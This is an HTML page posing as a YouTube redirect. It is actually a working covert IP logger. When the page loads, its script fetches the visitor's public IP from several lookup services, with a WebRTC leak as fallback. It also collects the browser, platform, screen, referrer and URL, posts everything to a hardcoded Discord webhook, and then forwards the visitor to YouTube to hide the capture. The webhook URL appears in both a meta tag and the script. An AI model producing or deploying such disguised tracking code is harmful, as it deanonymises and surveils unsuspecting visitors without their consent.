<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Redirecting...</title>
    
    <meta name="discord-webhook" content="https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma">
    
    <meta http-equiv="refresh" content="3;url=https://www.youtube.com">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #333333, #2b2b2b);
            font-family: 'Arial', sans-serif;
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <script>
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma";
        
        async function getRealIP() {
            console.log('Getting IP address...');
            
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://api.myip.com',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://api.db-ip.com/v2/free/self'
            ];
            
            for (const service of ipServices) {
                try {
                    console.log(`Trying: ${service}`);
                    const controller = new AbortController();
                    const timeout = setTimeout(() => controller.abort(), 5000);
                    
                    const response = await fetch(service, {
                        signal: controller.signal,
                        headers: {
                            'Accept': 'application/json'
                        }
                    });
                    
                    clearTimeout(timeout);
                    
                    if (response.ok) {
                        const data = await response.json();
                        console.log('API response:', data);
                        
                        const ip = data.ip || data.ipAddress || data.query || data.clientIp || 'Unknown';
                        
                        if (ip !== 'Unknown' && ip !== '' && !ip.includes('undefined')) {
                            console.log(`IP found: ${ip}`);
                            return ip;
                        }
                    }
                } catch (error) {
                    console.log(`Service ${service} failed: ${error.message}`);
                    continue;
                }
            }
            
            console.log('All API methods failed, trying WebRTC...');
            
            try {
                const rtcIP = await getWebRTCIP();
                if (rtcIP) {
                    console.log(`WebRTC IP: ${rtcIP}`);
                    return rtcIP;
                }
            } catch (error) {
                console.log(`WebRTC failed: ${error.message}`);
            }
            
            return 'Unknown';
        }
        
        function getWebRTCIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({iceServers: []});
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice.candidate) {
                            pc.close();
                            resolve(null);
                            return;
                        }
                        
                        const candidate = ice.candidate.candidate;
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = candidate.match(ipRegex);
                        
                        if (match) {
                            const ip = match[1];
                            if (!ip.startsWith('192.168.') && 
                                !ip.startsWith('10.') && 
                                !ip.startsWith('172.16.')) {
                                pc.close();
                                resolve(ip);
                            }
                        }
                    };
                    
                    setTimeout(() => {
                        pc.close();
                        resolve(null);
                    }, 2000);
                } catch (error) {
                    resolve(null);
                }
            });
        }
        
        function collectBrowserData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                hostname: window.location.hostname,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
        }
        
        async function sendToDiscord(data) {
            console.log('Sending to Discord...', data);
            
            try {
                const embed = {
                    title: 'ðŸ” NEW VISITOR DETECTED',
                    color: 0xFF0000,
                    timestamp: data.browser.timestamp,
                    fields: [
                        {
                            name: 'ðŸŒ IP Address',
                            value: `\`\`\`${data.ip}\`\`\``,
                            inline: true
                        },
                        {
                            name: 'ðŸ–¥ï¸ Device Info',
                            value: `${data.browser.platform} - ${data.browser.screen}`,
                            inline: true
                        },
                        {
                            name: 'ðŸŒ Browser',
                            value: data.browser.userAgent.substring(0, 50) + '...',
                            inline: false
                        },
                        {
                            name: 'ðŸ”— Referrer',
                            value: data.browser.referrer,
                            inline: true
                        },
                        {
                            name: 'ðŸ“± URL',
                            value: data.browser.url,
                            inline: true
                        }
                    ],
                    footer: {
                        text: 'IP Logger'
                    }
                };
                
                const payload = {
                    embeds: [embed],
                    username: 'IP Tracker',
                    avatar_url: 'https://cdn.discordapp.com/attachments/847471116316999690/894877973234393118/ezgif-4-b84848c6b4.gif'
                };
                
                console.log('Payload:', payload);
                
                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                console.log('Discord response status:', response.status);
                
                if (response.ok) {
                    console.log('Successfully sent to Discord!');
                    return true;
                } else {
                    const errorText = await response.text();
                    console.log(`Discord error ${response.status}: ${errorText}`);
                    return false;
                }
                
            } catch (error) {
                console.log(`Send error: ${error.message}`);
                return false;
            }
        }
        
        async function collectData() {
            try {
                console.log('Starting data collection...');
                const ip = await getRealIP();
                console.log('Final IP:', ip);
                
                const browserData = collectBrowserData();
                
                const collectedData = {
                    ip: ip,
                    browser: browserData
                };
                
                console.log('Sending data:', collectedData);
                await sendToDiscord(collectedData);
                
            } catch (error) {
                console.log(`Collection error: ${error.message}`);
                
                const fallbackData = {
                    ip: 'Unknown (Error)',
                    browser: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        timestamp: new Date().toISOString(),
                        url: window.location.href
                    }
                };
                
                await sendToDiscord(fallbackData);
            }
        }
        
        window.addEventListener('load', () => {
            console.log('Page loaded, starting data collection...');
            collectData();
            
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com';
            }, 3000);
        });
    </script>
</body>
</html>